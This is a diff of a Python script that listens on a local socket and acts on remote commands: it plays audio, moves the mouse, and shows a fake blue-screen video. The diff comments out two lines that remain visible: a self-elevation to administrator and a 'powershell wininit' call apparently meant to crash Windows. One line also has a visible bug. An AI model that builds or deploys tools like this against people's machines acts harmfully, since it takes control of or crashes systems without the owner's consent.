@@ -1,3 +1,4 @@
+from platform import system
 import socket
 import pygame
 import time
@@ -6,9 +7,11 @@ import threading
 import math
 import os
 import ctypes
+import random
+import sys
 
 #Initilizing things
-ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # Runs as admin
+#ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # Runs as admin
 pygame.mixer.init()
 addr = "127.0.0.1"
 port = 4560
@@ -47,25 +50,21 @@ def MoveMouse(x, y):
         win32api.SetCursorPos((x2, y2))
 
 def bsod(videopath, waittime):
-    pygame.init()
-    DISPLAYSURF = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
-    movie = pygame.movie.Movie(videopath)
-    movie_screen = pygame.Surface(movie.get_size()).convert()
-    movie.set_display(movie_screen)  
-    movie.play()
+    os.startfile(videopath)
     time.sleep(waittime)
-    os.system('powershell wininit')
-
+    print("BSOD STARTED")
+    #os.system('powershell wininit')
+    
 def returnScreenRes():
     res = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
     return res
 
 def parse(args):
     if args[0] == "audio":
-        if args[1] == "false":
-            playAudio(False)
+        if args[1] == "stop":
+            playAudio(True)
         else:
-            playAudio(args[1])
+            playAudio(args[1], False)
     if args[0] == "mm":
         MoveMouse(int(args[1]), int([2]))
     if args[0] == "mmr":
@@ -85,16 +84,6 @@ try:
         print(splitargs)
 
         parse(splitargs)
-except:
-    print("BRUH")
+except Exception as e:
+    print(f'Error: {e}')
 
-'''
-    if buffer == "music":
-        PlayMusic()
-
-    if buffer == "music stop":
-        StopMusic()
-
-    if buffer == "stop":
-        exit()
-'''
